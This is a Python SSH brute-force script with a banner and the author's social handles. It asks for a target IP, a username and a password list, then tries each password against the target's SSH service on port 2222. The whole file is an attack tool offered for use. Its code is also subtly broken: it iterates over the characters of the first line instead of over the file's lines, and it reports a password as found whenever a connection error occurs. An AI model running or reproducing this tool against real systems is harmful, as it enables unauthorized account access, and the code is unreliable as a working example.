from time import sleep
from platform import node, system, release; Node, System, Release = node(), system(), release() 
import paramiko
import sys
import os


def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(.01)

r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'

printLow(f"""

{r}███████╗███████╗██╗  ██╗      ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
{r}██╔════╝██╔════╝██║  ██║      ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
{w}███████╗███████╗███████║█████╗██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
{w}╚════██║╚════██║██╔══██║╚════╝██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
{g}███████║███████║██║  ██║      ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
{g}╚══════╝╚══════╝╚═╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                                                 

    {y}[*] Info:
    {g}[+] {y}Telegram-PV: {w}@Error_fiat  
    {g}[+] {y}Github: {w}https://github.com/errorfiathck 
    {g}[+] {y}Instagram: {w}https://instagram.com/error._.fiat  
    {g}[+] {y}Youtube: {w}https://youtube.com/error_fiat  
    
    {y}system:\n    {g}[+] {y}Platform: {w}{System}          
    {g}[+] {y}Node: {w}{Node}\n    {g}[+] {y}Release: {w}{Release}   \n\n                                                                   
""")

target = str(input(f"{r}Enter the Target IP address\n ==> "))
username = str(input(f"{w}Enter the Username To Bruteforce\n ==>"))
pssword_file = str(input(f"{g}Enter the Pass list File \n ==>"))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    try:
        ssh.connect(target, port=2222, username=username, password=password)
    except paramiko.AuthenticationException:
        code += 1

    
    ssh.close()

    return code


with open(pssword_file, "r") as file:
    for line in file.readline():
        password = line.strip()




        try:
            response = ssh_connect(password)

            if response == 0:
                print("password Found:  " + password)
                exit()

            
            elif response == 1:
                print("No luck!!")

        
        except Exception as e:
            print(e)

        
        pass

